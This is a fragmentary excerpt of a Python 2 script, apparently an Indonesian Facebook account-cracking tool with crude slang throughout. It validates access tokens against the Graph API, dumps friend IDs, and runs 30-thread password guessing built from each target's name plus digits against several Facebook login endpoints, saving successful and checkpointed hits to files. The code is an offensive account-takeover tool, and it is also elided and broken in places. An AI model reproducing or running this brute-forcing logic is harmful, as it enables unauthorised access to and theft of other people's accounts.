...
from concurrent.futures import ThreadPoolExecutor as AangGanteng
...
def yayanxd():
    ...
    try:
        ...
        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);aangardiansyah()
...
def aang_ardiansyah():
    ...
    try:
        ...
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');aanggnz()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');aanggnz()
    ...
    if pepek == '':
        ...
        try:
            ...
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));aang_ardiansyah)
        except (IOError):
        ...
        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);aang_ardiansyah()
...
def teman(kontol):
    ...
    try:
        ...
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));aang_ardiansyah()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));aang_ardiansyah()
'''
...
def cek_info(kontol):
    try:
        ...
        if user == '':
            print "\n [%s!%s] jangan kosong bro"%(M,N);cek_info(kontol)
...
def info_tools():
    ...
    print '\n %s[%s>%s] Author   : Moh Aang Ardiansyah-Xyz.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Github   : https://github.com/AangGnz-xyz'%(N,H,N);time.sleep(0.07)
...
def yo_ndak_tau_ko_tanya_saia():
    ...
    try:
        ...
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));aang_ardiansyah()
    except:pass
...
class __crack__:
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__ang__()
                        elif cin == '1':
                            ...
                            with AangGanteng(max_workers=30) as (__AangGanz-xyz__):
                                for ikeh in self.id:
                                    try:
                            ...
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with AangGanteng(max_workers=30) as (__AangGnz-xyz__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __AangGnz-xyz__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass
    ...
    def __mbasic__(self, user, __ang__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __ang__:
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with AangGanteng(max_workers=30) as (__Aangxyz__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __Aangxyz__.submit(self.__api__, uid, pwx)
                    except:
                        pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __Aangxyz__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __Aangxyz__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
            ...
            print '\n %s[%s×%s] input yang bener ngentot'%(N,M,N);self.__pler__()
